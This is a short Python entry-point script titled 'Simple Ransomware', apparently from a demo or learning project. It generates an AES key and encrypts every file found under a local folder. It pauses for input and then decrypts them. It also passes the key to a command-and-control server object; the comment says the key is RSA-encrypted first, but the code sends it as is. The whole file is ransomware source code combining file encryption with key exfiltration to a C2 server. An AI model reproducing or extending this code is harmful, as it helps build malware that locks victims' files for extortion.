# Simple Ransomware - Shinji Mimura

# Import Classes
from operator import truediv
from tracemalloc import stop
from crypto.main import CryptClass
from server.main import C2Server
from utils.filefinder import FileFinder
from utils.RSAGenerator import RSAGen
from utils.AESGenerator import AESGenerator

# Import packages
import time
import pyaes

if __name__ == "__main__":

    # Classes
    aesgen = AESGenerator()
    cryptclass = CryptClass(aesgen.aes_key_generator().encode())
    c2server = C2Server()
    filefinder = FileFinder()

    aes = pyaes.AESModeOfOperationCTR(cryptclass.key)

    filefinder.filepaths("./files")

    for f in filefinder.file_paths:
        cryptclass.encrypt(f, aes)

    stopkey = True
    while stopkey:
        op = int(input(("[STOPPED] Press 1 to continue: ")))
        if op == 1:
            stopkey = False

    aes = pyaes.AESModeOfOperationCTR(cryptclass.key)

    for f in filefinder.file_paths:
        cryptclass.decrypt(f, aes)

    # Encrypt AES Key with Public RSA Key and send to C2 Server
    c2server.send_machine(cryptclass.key)
